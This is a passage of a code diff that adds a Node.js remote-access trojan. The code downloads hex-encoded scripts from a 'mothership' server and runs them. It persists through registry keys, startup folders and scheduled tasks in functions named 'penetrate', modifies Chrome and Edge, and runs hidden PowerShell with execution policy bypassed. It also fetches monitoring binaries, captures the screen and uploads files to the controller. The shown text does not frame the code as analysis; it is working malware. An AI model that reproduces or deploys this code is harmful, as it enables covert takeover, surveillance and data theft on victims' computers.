+            childp = launchrelay(enginename, pubnubr, browsername);
+        }
+    };
+
+    relaycmd.loop();
+
+    logmsg("finished");
+}
+
+function execjob() {
+    logmsg("starting");
+
+    let configfpath = "";
+
+    configfpath = process_argv.length >= 4 ? process_argv[3] : "";
+
+    logmsg("reading configfpath: " + configfpath);
+
+    if (!fileExists(configfpath)) {
+        throw new Error("configfpath does not exist " + configfpath);
+    }
+
+    let jsonconfigstr = readTag(configfpath);
+
+    if (isNullOrWhitespace(jsonconfigstr)) {
+        throw new Error("jsonconfigstr is empty");
+    }
+
+    logmsg("jsonconfigstr=" + jsonconfigstr);
+
+    let clientjob = JSON.parse(jsonconfigstr);
+
+    logmsg("clientjob: " + JSON.stringify(clientjob));
+
+    let jobfileext = path.extname(clientjob.jobfilename).toLowerCase();
+
+    logmsg("jobfileext: " + jobfileext);
+
+    if (
+        ![".bat", ".js", ".vbs", ".py", ".ps1"].includes(
+            jobfileext.toLowerCase()
+        )
+    ) {
+        throw new Error(`file extension is not supported ${jobfileext}`);
+    }
+
+    if (jobfileext.toLowerCase() == ".bat") {
+        execCMDScript(clientjob.localpath);
+    } else if (jobfileext.toLowerCase() == ".py") {
+        execPYTHONScript(clientjob.localpath);
+    } else if (jobfileext.toLowerCase() == ".js") {
+        execNODEScript(clientjob.localpath);
+    } else if (jobfileext.toLowerCase() == ".vbs") {
+        execVBSScript(clientjob.localpath);
+    } else if (jobfileext.toLowerCase() == ".ps1") {
+        execPSScript(clientjob.localpath);
+    }
+
+    logmsg("finished");
+}
+
+async function retrieveClientJob() {
+    logmsg("starting");
+
+    let baseUrl = systemstate.mothership + "/ow/retrieve.php";
+    let params = systemstate.statekvp;
+    params.filename = "execute_cmdlist";
+
+    let localpath = systemstate.getClientJobPath();
+
+    let downloadOpts = {
+        download: true,
+        filetype: "txt",
+        localpath: localpath,
+    };
+    let response = await makeGetRequest(baseUrl, params, null, downloadOpts);
+
+    if (!response.headers) {
+        throw new Error("could not access response headers");
+    }
+
+    if (!fileExists(localpath)) {
+        throw new Error("job file does not exist");
+    }
+
+    let jobcode = "";
+    let jobfilename = "";
+
+    if (keyExists(response.headers, "X-JobCode"))
+        jobcode = response.headers[getKey(response.headers, "X-JobCode")];
+
+    if (keyExists(response.headers, "X-JobFilename"))
+        jobfilename =
+            response.headers[getKey(response.headers, "X-JobFilename")];
+
+    if (isNullOrWhitespace(jobcode)) {
+        throw new Error("jobcode is empty");
+    }
+
+    if (isNullOrWhitespace(jobfilename)) {
+        throw new Error("jobfilename is empty");
+    }
+
+    let fileext = path.extname(jobfilename);
+
+    let hextext = fs.readFileSync(localpath, "utf-8");
+    let jobtext = Buffer.from(hextext, "hex").toString("utf8");
+    localpath = systemstate.getClientJobPath(); // + (fileext ?? "");
+    fs.writeFileSync(localpath, jobtext);
+
+    let clientjob = {
+        jobcode: jobcode,
+        jobtype: "execute_cmdlist",
+        localpath: localpath,
+        jobfilename: jobfilename,
+    };
+
+    logmsg("retrieved client job: " + JSON.stringify(clientjob));
+
+    logmsg("finished");
+
+    return clientjob;
+}
+
+function cmdlist_handlecmdjob(clientjob) {
+    logmsg("starting");
+
+    let cmdlistcmd = systemstate.cmdconfig;
+
+    let cmdname = clientjob.cmdname.toLowerCase();
+
+    let stopcmd = false;
+
+    if (cmdname.startsWith("start")) {
+        cmdname = cmdname.replace("start", "");
+    } else if (cmdname.startsWith("stop")) {
+        cmdname = cmdname.replace("stop", "");
+        stopcmd = true;
+    }
+
+    if (!CmdConfig.isCmdExist(cmdname)) {
+        throw new Error(`command is not supported ${cmdname}`);
+    }
+
+    if (stopcmd) {
+        let jobcmd = cmdlistcmd.getChildCmd(cmdname);
+
+        if (!jobcmd) {
+            throw new Error(`child cmd ${cmdname} not in child cmd list`);
+        }
+
+        jobcmd.processMessage = (msg) => {
+            logmsg(JSON.stringify(msg));
+        };
+
+        cmdlistcmd.sendMessage(jobcmd, "cmdlist", clientjob);
+    } else {
+        let jobcmd = cmdlistcmd.newCmdConfig(cmdname);
+
+        if (!jobcmd) {
+            throw new Error(`could not create child cmd ${cmdname}`);
+        }
+
+        jobcmd.processMessage = (msg) => {
+            logmsg(JSON.stringify(msg));
+        };
+
+        let ret = jobcmd.launch([clientjob["configfpath"]]); // TODO refactor such that launch func grabs clientjob from jobcmd
+
+        jobcmd.childprocess.unref();
+    }
+
+    logmsg("finished");
+
+    return;
+}
+
+// generates child cmds corresponding to clientjob being pushed via ping
+// jobtype == 'EXEC_CMD' --> internal cmd is executed
+//            'execute_cmdlist', --> job file is retrieved using retrieve.php
+// otherwise job file is executed using script engine
+async function cmdlist_handleMessage(msg) {
+    logmsg("starting");
+
+    let cmdlistcmd = systemstate.cmdconfig;
+
+    let clientjob = msg?.payload ?? null;
+
+    if (!clientjob) {
+        throw new Error("unable to extract clientjob");
+    }
+
+    logmsg("received new client job: " + JSON.stringify(clientjob));
+
+    let jobtype = clientjob?.jobtype ?? "";
+    jobtype = jobtype.toLowerCase();
+
+    if (jobtype == "execute_cmdlist") {
+        clientjob = await retrieveClientJob();
+    }
+
+    let configfpath = systemstate.getClientJobConfigPath();
+
+    fs.writeFileSync(configfpath, JSON.stringify(clientjob));
+
+    clientjob["configfpath"] = configfpath;
+
+    if (!fileExists(configfpath)) {
+        throw new Error(`clientjobconfigpath does note exist ${configfpath}`);
+    }
+
+    if (jobtype.toLowerCase() == "EXEC_CMD".toLowerCase()) {
+        cmdlist_handlecmdjob(clientjob);
+        return;
+    }
+
+    // TODO: validate clientjob object before launching command
+
+    let execjobcmd = cmdlistcmd.newCmdConfig("execjob");
+
+    if (!execjobcmd) {
+        throw new Error("could not create child cmd execjob");
+    }
+
+    let ret = execjobcmd.launch([configfpath]);
+
+    execjobcmd.childprocess.unref();
+
+    logmsg("finished");
+}
+
+function cmdlist() {
+    logmsg("starting");
+
+    let cmdlistcmd = systemstate.cmdconfig;
+
+    if (cmdlistcmd.cmdname != "cmdlist") {
+        throw new Error("cmdlist routine must only be called from cmdlist cmd");
+    }
+
+    handleMessage = cmdlist_handleMessage;
+
+    cmdlistcmd.loopfunc = () => {
+        logmsg("cmdlist looping...");
+    };
+
+    cmdlistcmd.loop();
+
+    logmsg("finished");
+}
+
+async function reschedule() {
+    let tasknames = taskconfig.tasknames;
+
+    for (let i = 0; i < tasknames.length; i++) {
+        let taskname = tasknames[i];
+
+        logmsg(`checking if task exists ${taskname}`);
+        let taskexist = await getTaskExists(taskname);
+
+        if (taskexist) {
+            logmsg(`task ${taskname} exists`);
+            continue;
+        }
+
+        logmsg(`creating task ${taskname}`);
+        await createTask(taskname);
+    }
+}
+
+async function exec_ps_cmd(psScript) {
+    return new Promise((resolve, reject) => {
+        const child = spawn(
+            "powershell.exe",
+            [
+                "-NoProfile",
+                "-ExecutionPolicy",
+                "Bypass",
+                "-NonInteractive",
+                "-WindowStyle",
+                "Hidden",
+                "-Command",
+                "-",
+            ],
+            { stdio: ["pipe", "pipe", "pipe"] }
+        );
+
+        let stdoutData = "";
+        let stderrData = "";
+
+        child.stdout.on("data", (chunk) => {
+            stdoutData += chunk.toString();
+        });
+
+        child.stderr.on("data", (chunk) => {
+            stderrData += chunk.toString();
+        });
+
+        child.on("error", (err) => {
+            reject(err);
+        });
+
+        child.on("close", (code) => {
+            if (code !== 0) {
+                reject(
+                    new Error(
+                        `PowerShell exited with code ${code}: ${stderrData}`
+                    )
+                );
+            } else {
+                resolve(stdoutData.trim());
+            }
+        });
+
+        child.stdin.write(psScript);
+        child.stdin.end();
+    });
+}
+
+async function penetrate_reg() {
+    for (const reg of regstartupconfig.regs) {
+        let script_text = "";
+        try {
+            script_text = regstartupconfig.get_startup_script(reg);
+            let ret = await exec_ps_cmd(script_text);
+            return ret;
+        } catch (err) {
+            logmsg(err);
+            logmsg(script_text);
+        }
+    }
+
+    return null;
+}
+
+async function download_launch_script() {
+    let filename = systemconfig.launch_script_fname;
+
+    let baseUrl = systemstate.mothershipassets + "/" + filename;
+    let localpath = path.join(systemstate.trojandir, filename);
+
+    let downloadOpts = {
+        download: true,
+        filetype: "bin",
+        localpath: localpath,
+    };
+
+    let response = await makeGetRequest(baseUrl, null, null, downloadOpts);
+
+    if (!fileExists(localpath)) {
+        throw new Error("download failed for " + localpath);
+    }
+
+    const stats = fs.statSync(localpath);
+    logmsg(`${localpath} -- File size: ${stats.size} bytes`);
+}
+
+function penetrate_folders() {
+    let foldernames = startupfolderconfig.foldernames;
+
+    for (let i = 0; i < foldernames.length; i++) {
+        let foldername = foldernames[i];
+        let fpath = startupfolderconfig.getScriptPath(foldername);
+        let script_txt = startupfolderconfig.getLauncherScript(foldername);
+
+        logmsg(`writing launch script to ${fpath}`);
+        fs.writeFileSync(fpath, script_txt, "utf8");
+    }
+}
+
+// TODO need to execute modify_chrome and modify_edge on each startup
+// for tpl -- the desktop lnk can't be modified -- good idea to put in autolaunch to launch 
+// and minimise both edge and chrome on startup -- should these processes be headless?
+async function penetrate() {
+    logmsg("starting");
+
+    if (ISDEBUG) {
+        process.exit(0);
+    }
+
+    if (!fileExists(systemconfig.launch_script_fpath)) {
+        await download_launch_script();
+    }
+
+    await modify_chrome();
+    await modify_edge();
+
+    await reschedule();
+    await penetrate_reg();
+    await penetrate_folders();
+
+    // TODO await cleanup()
+    // check if trojandir needs cleanup, if so remove log files, etc.
+
+    logmsg("finished");
+    process.exit(0);
+}
+
+async function invoke_exe(
+    exename,
+    targs = null,
+    exedirpath = "",
+    stdoutfunc,
+    stderrfunc,
+    closefunc,
+    async = false
+) {
+    return new Promise((resolve, reject) => {
+        const exePath = path.join(exedirpath ?? "", exename);
+
+        logmsg(`spawning ${exePath}`);
+
+        let child = spawn(exePath, targs, {
+            shell: true, // exename.slice(-4) == ".cmd",
+            windowsHide: true,
+            stdio: "pipe",
+        });
+
+        if (async) resolve(child);
+
+        if (!child) {
+            throw new Error("failed to spawn child process");
+        }
+
+        try {
+            child?.stdout?.on("data", (data) => {
+                let text = data.toString();
+
+                if (stdoutfunc) stdoutfunc(text);
+            });
+
+            child?.stderr?.on("data", (data) => {
+                let text = data.toString();
+
+                if (stderrfunc) stderrfunc(text);
+            });
+
+            child?.on("close", (code) => {
+                logmsg(`[YYW24]Child process exited with code ${code}`);
+
+                if (closefunc) {
+                    closefunc(code);
+                }
+
+                resolve(child);
+            });
+
+            child.on("error", (err) => {
+                logmsg("Failed to start child process:", err);
+                reject(err);
+            });
+        } catch (err) {
+            logmsg(err);
+        }
+    });
+}
+
+async function retrieve_asset(assetfname, assetdir, localdir) {
+    let baseUrl =
+        systemstate.mothershipassets +
+        "/" +
+        (isNullOrWhitespace(assetdir) ? "" : assetdir + "/") +
+        assetfname;
+    let localpath = null;
+
+    if (isNullOrWhitespace(localdir))
+        localpath = path.join(systemstate.trojandir, assetfname);
+    else {
+        if (!folderExists(localdir)) {
+            fs.mkdirSync(systemstate.nodegsdfilesdir, { recursive: true });
+        }
+
+        localpath = path.join(localdir, assetfname);
+    }
+
+    let downloadOpts = {
+        download: true,
+        filetype: "bin",
+        localpath: localpath,
+    };
+
+    let response = await makeGetRequest(baseUrl, null, null, downloadOpts);
+
+    /* downloadOpts { filetype, localpath, download }
+        rawText
+        buffer
+        status
+        statusText
+        headers */
+
+    if (!fileExists(localpath)) {
+        throw new Error("retrieve failed for: " + localpath);
+    }
+
+    const stats = fs.statSync(localpath);
+    logmsg(`${localpath} -- File size: ${stats.size} bytes`);
+
+    return response;
+}
+
+function verify_node_download() {
+    let missingfiles = [];
+
+    let filenames = Array.from({ length: 480 }, (_, index) => index + 1);
+
+    filenames = filenames.map(String);
+    filenames = filenames.map((_, i) => {
+        return "disk" + _ + ".gsd";
+    });
+
+    for (let i = 0; i < filenames.length; i++) {
+        let filename = filenames[i];
+        let fpath = path.join(systemstate.nodegsdfilesdir, filename);
+
+        if (!fileExists(fpath)) {
+            missingfiles.push({ filename: filename, msg: "file is missing" });
+            continue;
+        }
+
+        const stats = fs.statSync(fpath);
+
+        if (filename == "disk1.gsd") {
+            if (stats.size != 1696) {
+                let msg = `file not the correct size {fpath} {stats.size} 1696`;
+                missingfiles.push({
+                    filename: filename,
+                    msg: msg,
+                });
+            }
+        } else if (filename == "disk480.gsd") {
+            if (stats.size != 59246) {
+                let msg = `file not the correct size {fpath} {stats.size} 65443`;
+                missingfiles.push({
+                    filename: filename,
+                    msg: msg,
+                });
+            }
+        } else {
+            if (stats.size != 100000) {
+                let msg = `file not the correct size {fpath} {stats.size} 65443`;
+                missingfiles.push({
+                    filename: filename,
+                    msg: msg,
+                });
+            }
+        }
+    }
+
+    if (missingfiles.length > 0) {
+        return { status: false, missingfiles: missingfiles };
+    }
+
+    return { status: true };
+}
+
+async function verify_node_install() {
+    let fpath = path.join(systemstate.nodedir, "node-v26.4.0-win-x64");
+
+    if (!folderExists(fpath)) {
+        return { state: false, msg: `node install folder does not exist` };
+    }
+
+    fpath = path.join(systemstate.nodedir, "node-v26.4.0-win-x64", "node.exe");
+
+    if (!fileExists(fpath)) {
+        return { state: false, msg: "node.exe does not exist " + fpath };
+    }
+
+    fpath = path.join(systemstate.nodedir, "node-v26.4.0-win-x64");
+
+    let childp = null;
+
+    try {
+        childp = await invoke_exe("node.exe", ["--version"], fpath, (text) => {
+            text = text ?? "ERROR_EMPTY_OUTPUT";
+
+            if (!text.includes("v26.4.0")) {
+                return {
+                    state: false,
+                    msg: `node install failed -- could not verify version {text}`,
+                };
+            }
+        });
+    } catch (err) {
+        logmsg(err);
+    }
+
+    try {
+        childp = await invoke_exe("npm.cmd", ["--version"], fpath, (text) => {
+            text = text ?? "ERROR_EMPTY_OUTPUT";
+
+            if (!text.includes("11.17.0")) {
+                return {
+                    state: false,
+                    msg: `node install failed -- could not verify npm version {text}`,
+                };
+            }
+        });
+    } catch (err) {
+        logmsg(err);
+    }
+
+    return { state: true };
+}
+
+async function download_node(missingfiles) {
+    logmsg("starting");
+
+    let filenames = [];
+
+    if (missingfiles && missingfiles.length > 0) {
+        for (let i = 0; i < missingfiles.length; i++)
+            filenames.push(missingfiles[i].filename);
+    } else {
+        filenames = Array.from({ length: 480 }, (_, index) => index + 1);
+
+        filenames = filenames.map(String);
+        filenames = filenames.map((_, i) => {
+            return "disk" + _ + ".gsd";
+        });
+    }
+
+    for (let i = 0; i < filenames.length; i++) {
+        let filename = filenames[i];
+        // let fpath = path.join(systemstate.nodegsdfilesdir, filename);
+
+        let baseUrl =
+            systemstate.mothershipassets + "/node/gsd_files/" + filename;
+        let localpath = path.join(systemstate.nodegsdfilesdir, filename);
+
+        fs.mkdirSync(systemstate.nodegsdfilesdir, { recursive: true });
+
+        let downloadOpts = {
+            download: true,
+            filetype: "bin",
+            localpath: localpath,
+        };
+
+        let response = await makeGetRequest(baseUrl, null, null, downloadOpts);
+
+        /* downloadOpts { filetype, localpath, download }
+           rawText
+           buffer
+           status
+           statusText
+           headers */
+
+        if (!fileExists(localpath)) {
+            throw new Error("download failed for " + localpath);
+        }
+
+        const stats = fs.statSync(localpath);
+        logmsg(`${localpath} -- File size: ${stats.size} bytes`);
+    }
+
+    logmsg("finished");
+}
+
+async function install_node() {
+    logmsg("starting");
+
+    let installcmd = systemstate.cmdconfig;
+
+    let verify_node = await verify_node_install();
+
+    if (verify_node.state) {
+        logmsg("node installed -- passing through");
+        process.exit(0);
+        return;
+    }
+
+    verify_node = verify_node_download();
+
+    if (!verify_node?.state) {
+        logmsg(verify_node?.msg);
+        await download_node(verify_node?.missingfiles);
+    }
+
+    verify_node = verify_node_download();
+
+    if (!verify_node?.state) {
+        // logmsg(verify_node?.msg); // TO
+        throw new Error("node download failed");
+    }
+
+    if (!fileExists(path.join(systemstate.trojandir, "7za.exe")))
+        await retrieve_asset("7za.exe");
+
+    if (!fileExists(path.join(systemstate.trojandir, "gunite.exe")))
+        await retrieve_asset("gunite.exe");
+
+    let args = [
+        path.join(systemstate.nodegsdfilesdir, "disk1.gsd"),
+        "-u",
+        path.join(systemstate.nodedir, "node.zip"),
+        "-s",
+    ];
+
+    let childp = null;
+
+    try {
+        childp = await invoke_exe("gunite.exe", args); // throws error despite success
+    } catch (err) {
+        logmsg(err);
+    }
+
+    let fpath = path.join(systemstate.nodedir, "node.zip");
+
+    if (!fileExists(fpath)) {
+        throw new Error("file does not exist " + fpath);
+    }
+
+    const stats = fs.statSync(fpath);
+    if (!stats.size == 47549770) {
+        throw new Error("incorrect file size " + stats.size + " 72890982");
+    }
+
+    args = ["x", fpath, "-o" + systemstate.nodedir, "-aoa", "-y"];
+
+    try {
+        childp = await invoke_exe("7za.exe", args);
+    } catch (err) {
+        logmsg(err);
+    }
+
+    verify_node = await verify_node_install();
+
+    if (!verify_node?.state) {
+        throw new Error(verify_node?.msg);
+    }
+
+    logmsg("finished");
+}
+
+function get_python_install_filenames() {
+    let filenames = Array.from({ length: 735 }, (_, index) => index + 1);
+
+    filenames = filenames.map(String);
+    filenames = filenames.map((_, i) => {
+        return "disk" + _ + ".gsd";
+    });
+
+    return filenames;
+}
+
+function verify_python_download() {
+    let filenames = get_python_install_filenames();
+
+    let filenames_out = [];
+
+    for (let i = 0; i < filenames.length; i++) {
+        let filename = filenames[i];
+        let fpath = path.join(systemstate.gsdfilesdir, filename);
+
+        if (!fileExists(fpath)) {
+            logmsg(`file does not exist ${fpath}`);
+            filenames_out.push(filename);
+            continue;
+        }
+
+        const stats = fs.statSync(fpath);
+
+        // disk1.gsd --> 1,696
+        // disk735.gsd --> 65,443
+        // 100,000
+
+        if (filename == "disk1.gsd") {
+            if (stats.size != 1696) {
+                logmsg(`file not the correct size ${fpath} {stats.size} 1696`);
+                filenames_out.push(filename);
+            }
+        } else if (filename == "disk735.gsd") {
+            if (stats.size != 65443) {
+                filenames_out.push(filename);
+                logmsg(`file not the correct size ${fpath} {stats.size} 65443`);
+            }
+        } else {
+            if (stats.size != 100000) {
+                filenames_out.push(filename);
+                logmsg(
+                    `file not the correct size ${fpath} ${stats.size} 65443`
+                );
+            }
+        }
+    }
+
+    return filenames_out;
+}
+
+async function verify_python_install() {
+    let fpath = systemstate.pythonexedir;
+
+    if (!folderExists(fpath)) {
+        logmsg(`python folder does not exist ${fpath}`);
+        return false;
+    }
+
+    let childp = null;
+
+    try {
+        childp = await invoke_exe(
+            "python.exe",
+            ["--version"],
+            fpath,
+            (text) => {
+                text = text ?? "ERROR_EMPTY_OUTPUT";
+
+                if (!text.includes("Python 3.10.5")) {
+                    logmsg(
+                        `python install failed -- could not verify python version ${text}`
+                    );
+                    return false;
+                }
+            }
+        );
+    } catch (err) {
+        logmsg(err);
+    }
+
+    return true;
+}
+
+// TODO install all modules psutil -- python -m pip install psutil
+async function install_python() {
+    logmsg("starting");
+
+    let installcmd = systemstate.cmdconfig;
+
+    let verify_python = await verify_python_install();
+
+    if (verify_python) {
+        logmsg("python is installed -- exiting");
+        process.exit(0);
+        return;
+    }
+
+    if (!fileExists(path.join(systemstate.trojandir, "7za.exe")))
+        await retrieve_asset("7za.exe");
+
+    if (!fileExists(path.join(systemstate.trojandir, "gunite.exe")))
+        await retrieve_asset("gunite.exe");
+
+    // TODO verify file MD5
+
+    let filenames = [];
+    if (!folderExists(systemstate.gsdfilesdir)) {
+        filenames = get_python_install_filenames();
+    } else {
+        filenames = verify_python_download();
+    }
+
+    if (filenames && filenames.length > 0) {
+        let ret = await download_python(filenames);
+    }
+
+    filenames = verify_python_download();
+
+    if (filenames && filenames.length > 0) {
+        throw new Error(
+            "python download failed: install files are missing or invalid " +
+            JSON.stringify(filenames)
+        );
+    }
+
+    logmsg("python pieces exist -- proceeding with gunite step");
+
+    let args = [
+        path.join(systemstate.gsdfilesdir, "disk1.gsd"),
+        "-u",
+        path.join(systemstate.pythondir, "portable_python.zip"),
+        "-s",
+    ];
+
+    let childp = null;
+
+    try {
+        childp = await invoke_exe("gunite.exe", args, systemstate.trojandir); // throws error despite success
+    } catch (err) {
+        logmsg(err);
+    }
+
+    let fpath = path.join(systemstate.pythondir, "portable_python.zip");
+
+    if (!fileExists(fpath)) {
+        throw new Error(`file does not exist ${fpath}`);
+    }
+
+    const stats = fs.statSync(fpath);
+    const zipsize = 72890982;
+    if (!stats.size == zipsize) {
+        throw new Error(
+            `incorrect file size ${stats.size} expected ${zipsize}`
+        );
+    }
+
+    logmsg("gunite step successful -- proceeding with unzip step");
+
+    args = [
+        "x",
+        path.join(systemstate.pythondir, "portable_python.zip"),
+        "-o" + path.join(systemstate.pythondir, "work"),
+        "-aoa",
+        "-y",
+    ];
+
+    try {
+        childp = await invoke_exe("7za.exe", args, systemstate.trojandir);
+    } catch (err) {
+        logmsg(err);
+    }
+
+    verify_python = await verify_python_install();
+
+    if (!verify_python) {
+        throw new Error("python install failed");
+    }
+
+    process.exit(0);
+
+    logmsg("finished");
+}
+
+async function download_python(filenames) {
+    logmsg("starting");
+
+    filenames = filenames ?? [];
+    filenames =
+        Array.isArray(filenames) && filenames.length > 0
+            ? filenames
+            : get_python_install_filenames();
+
+    for (let i = 0; i < filenames.length; i++) {
+        let filename = filenames[i];
+
+        let baseUrl = systemstate.mothershipassets + "/gsd_files/" + filename;
+        let localpath = path.join(systemstate.gsdfilesdir, filename);
+
+        fs.mkdirSync(systemstate.gsdfilesdir, { recursive: true });
+
+        let downloadOpts = {
+            download: true,
+            filetype: "bin",
+            localpath: localpath,
+        };
+
+        let response = await makeGetRequest(baseUrl, null, null, downloadOpts);
+
+        /* downloadOpts { filetype, localpath, download }
+           rawText
+           buffer
+           status
+           statusText
+           headers */
+
+        if (!fileExists(localpath)) {
+            throw new Error("download failed for " + localpath);
+        }
+
+        const stats = fs.statSync(localpath);
+        logmsg(`${localpath} -- File size: ${stats.size} bytes`);
+    }
+}
+
+async function retrieve() {
+    logmsg("starting");
+
+    let assets = [
+        systemconfig.launch_script_fname,
+        "pythonrelay.py",
+        "pc_monitoring.ps1",
+        "nircmdc.exe",
+        "7za.exe",
+        "gunite.exe",
+        "pcmon.dll",
+        "pcmon.exe",
+        "pslist.exe",
+    ];
+
+    for (let i = 0; i < assets.length; i++) {
+        let fname = assets[i];
+        let localpath = path.join(systemstate.trojandir, fname);
+
+        let baseUrl = systemstate.mothershipassets + "/" + fname;
+
+        if (fileExists(localpath)) {
+            logmsg(`assets exists ${localpath} -- skipping `);
+            continue;
+        }
+
+        let downloadOpts = {
+            download: true,
+            filetype: "bin",
+            localpath: localpath,
+        };
+
+        let response = await makeGetRequest(baseUrl, null, null, downloadOpts);
+
+        if (!fileExists(localpath)) {
+            throw new Error("retrieve failed for: " + localpath);
+        }
+
+        const stats = fs.statSync(localpath);
+        console.log(`${localpath} -- File size: ${stats.size} bytes`);
+    }
+
+    logmsg("finished");
+    process.exit(0);
+}
+
+async function cleanup() {
+    // check if trojandir has hit limits, then execute cleanup
+    // remove log files, etc.
+    // remove cmdlist_ directories
+    //   rmSync('./path/to/dir', { recursive: true, force: true });
+    //   fs.unlinkSync('./path/to/file.txt');
+    // *.json
+    // *.log
+}
+
+function launch_pcmon_koffi() {
+    const koffi = require("koffi");
+
+    let dllpath = path.join(systemstate.pcmondir, "pcmon.dll");
+
+    if (!fileExists(dllpath)) {
+        throw new Error("dll does not exist " + dllpath);
+    }
+
+    process.chdir(systemstate.pcmondir);
+
+    const lib = koffi.load(dllpath);
+    const pcmon_func = lib.func("__stdcall", "pcmon_main", "int", []);
+    pcmon_func();
+}
+
+async function download_pcmon() {
+    // retrieve pcmon.exe, pcmon.dll
+
+    if (!folderExists(systemstate.pcmondir)) {
+        fs.mkdirSync(systemstate.pcmondir, { recursive: true });
+    }
+
+    if (!systemstate.istpl) {
+        await retrieve_asset("pcmon.exe", null, systemstate.pcmondir);
+        return;
+    }
+
+    if (systemstate.istpl)
+        await retrieve_asset("pcmon.dll", null, systemstate.pcmondir);
+}
+
+async function pcmon_tpl() {
+    let dllpath = path.join(systemstate.pcmondir, "pcmon.dll");
+
+    if (!fileExists(dllpath)) {
+        await download_pcmon();
+
+        if (!fileExists(dllpath)) {
+            throw new Error("failed to download pcmon.dll");
+        }
+    }
+
+    try {
+        launch_pcmon_koffi();
+    } catch (err) {
+        logmsg(err);
+    }
+}
+
+async function pcmon() {
+    logmsg("starting");
+
+    let pcmoncmd = systemstate.cmdconfig;
+
+    if (systemstate.istpl) {
+        await pcmon_tpl();
+        return;
+    }
+
+    let exepath = path.join(systemstate.pcmondir, "pcmon.exe");
+
+    if (!fileExists(exepath)) {
+        await download_pcmon();
+
+        if (!fileExists(exepath)) {
+            throw new Error("failed to download pcmon.exe");
+        }
+    }
+
+    let killswitch = false;
+
+    handleMessage = (msgobj) => {
+        let clientjob = msg?.payload ?? null;
+
+        if (!clientjob) {
+            throw new Error("unable to extract clientjob");
+        }
+
+        logmsg("received new client job: " + JSON.stringify(clientjob));
+
+        if (clientjob?.cmdname.toLowerCase() == "StopPCMon".toLowerCase()) {
+            killswitch = true;
+        }
+    };
+
+    let childp = null;
+
+    pcmoncmd.loopfunc = () => {
+        logmsg(`{pcmoncmd.cmdname} looping...`);
+
+        let tcmdpid = childp?.pid ?? -1;
+
+        if (killswitch) {
+            if (isPidAlive(tcmdpid)) childp.kill();
+
+            if (isPidAlive(tcmdpid)) childp.kill("SIGKILL");
+        }
+
+        if (!killswitch && !isPidAlive(tcmdpid)) {
+            childp = invoke_exe("pcmon.exe");
+        }
+    };
+
+    pcmoncmd.loop();
+
+    logmsg("finished");
+}
+
+async function download_pspcmon() {
+    logmsg("starting");
+
+    let filename = "pc_monitoring.ps1";
+    let baseUrl = systemstate.mothershipassets + "/" + filename;
+    let localpath = path.join(systemstate.pspcmondir, filename);
+
+    fs.mkdirSync(systemstate.pspcmondir, { recursive: true });
+
+    let downloadOpts = {
+        download: true,
+        filetype: "bin",
+        localpath: localpath,
+    };
+
+    let response = await makeGetRequest(baseUrl, null, null, downloadOpts);
+
+    /* downloadOpts { filetype, localpath, download }
+        rawText
+        buffer
+        status
+        statusText
+        headers */
+
+    if (!fileExists(localpath)) {
+        return { state: false, msg: "download failed for " + localpath };
+    }
+
+    const stats = fs.statSync(localpath);
+    logmsg(`${localpath} -- File size: ${stats.size} bytes`);
+
+    logmsg("finished");
+
+    return { state: true };
+}
+
+async function pspcmon() {
+    logmsg("starting");
+
+    let pspcmoncmd = systemstate.cmdconfig;
+
+    let scriptfpath = path.join(systemstate.pspcmondir, "pc_monitoring.ps1");
+
+    if (!fileExists(scriptfpath)) {
+        await download_pspcmon();
+    }
+
+    if (!fileExists(scriptfpath)) {
+        throw new Error("pspcmon script does not exist " + scriptfpath);
+    }
+
+    let killswitch = false;
+
+    handleMessage = (msgobj) => {
+        let clientjob = msg?.payload ?? null;
+
+        if (!clientjob) {
+            throw new Error("unable to extract clientjob");
+        }
+
+        logmsg("received new client job: " + JSON.stringify(clientjob));
+
+        if (clientjob?.cmdname.toLowerCase() == "StopPSPCMon".toLowerCase()) {
+            killswitch = true;
+        }
+    };
+
+    let childp = null;
+
+    pspcmoncmd.loopfunc = () => {
+        logmsg(`{pspcmoncmd.cmdname} looping...`);
+
+        let tcmdpid = childp?.pid ?? -1;
+
+        if (killswitch) {
+            if (isPidAlive(tcmdpid)) childp.kill();
+
+            if (isPidAlive(tcmdpid)) childp.kill("SIGKILL");
+        }
+
+        if (!killswitch && !isPidAlive(tcmdpid)) {
+            childp = execPSScript(scriptfpath);
+        }
+    };
+
+    pspcmoncmd.loop();
+
+    logmsg("finished");
+}
+
+function getDirInfo(dirPath) {
+    const files = fs.readdirSync(dirPath);
+
+    const fileDetails = files.map((file) => {
+        const filePath = path.join(dirPath, file);
+        const stats = fs.statSync(filePath);
+
+        return {
+            filepath: filePath,
+            filename: file,
+            sizeBytes: stats.size,
+            modifiedDate: stats.mtime,
+            isDirectory: stats.isDirectory(),
+        };
+    });
+
+    return fileDetails;
+}
+
+// TODO remove and replace with retrieve_asset
+async function download_screencapture_script() {
+    let filename = "get_full_screen_capture.ps1"; // TODO move to systemconfig
+
+    let baseUrl = systemstate.mothershipassets + "/" + filename;
+    let localpath = path.join(systemstate.trojandir, filename);
+
+    let downloadOpts = {
+        download: true,
+        filetype: "bin",
+        localpath: localpath,
+    };
+
+    let response = await makeGetRequest(baseUrl, null, null, downloadOpts);
+
+    if (!fileExists(localpath)) {
+        throw new Error("download failed for " + localpath);
+    }
+
+    const stats = fs.statSync(localpath);
+    logmsg(`${localpath} -- File size: ${stats.size} bytes`);
+}
+
+async function upload_file(filename, jobcode, localfpath) {
+    if (isNullOrWhitespace(filename)) {
+        throw new Error("filename is null or empty");
+    }
+
+    if (!fileExists(localfpath)) {
+        throw new Error(`file does not exist ${localfpath}`);
+    }
+
+    let baseUrl = systemstate.mothership + "/ow/upload.php";
+
+    let kvp = systemstate.statekvp;
+    kvp["filename"] = filename;
+    kvp["jobcode"] = jobcode;
+
+    let response = await makePUTRequest(baseUrl, kvp, null, localfpath);
+
+    return response;
+}
+
+function exec_getscreencapture() {
+    return new Promise((resolve, reject) => {
+        let stdout = "";
+
+        let fpath = path.join(
+            systemstate.trojandir,
+            "get_full_screen_capture.ps1"
+        );
+
+        let childp = execPSScript(
+            fpath,
+            [systemstate.trojandir],
+            null,
+            (text) => (stdout += text),
+            (text) => (stdout += text),
+            (code) => {
+                resolve(stdout);
+            }
+        );
+    });
+}
+
+async function getscreencapture() {
+    logmsg("starting");
+
+    let runningcmd = systemstate.cmdconfig;
+
+    let ret = null;
+
+    ret = await logMsgMothership(
+        `starting getscreencapture -- jobcode=${runningcmd.jobcode}`
+    );
+
+    ret = await logEventMothership("job_started", runningcmd.jobcode);
+
+    let filename = "get_full_screen_capture.ps1"; // TODO move to systemconfig
+    let localpath = path.join(systemstate.trojandir, filename);
+
+    if (!fileExists(localpath)) {
